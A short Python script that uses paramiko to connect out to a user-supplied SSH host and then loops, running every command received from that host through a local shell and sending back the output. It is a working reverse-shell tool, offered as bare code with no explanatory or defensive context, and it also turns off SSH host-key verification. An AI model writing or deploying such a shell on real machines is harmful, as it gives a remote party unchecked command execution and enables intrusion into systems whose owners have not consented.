
import paramiko
import subprocess
import threading

def ssh_command(ip, user, password, command):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=password)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))
        while True:
            command = ssh_session.recv(1024)

            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)

            except Exception as e:
                ssh_session.send(str(e))
        client.close()
    return
host = input("[+]Host:")
username = input("[+] Username:")
password = input("[+] Password:")
message = input("[+] Message:")
ssh_command(host,username,password,message)
                
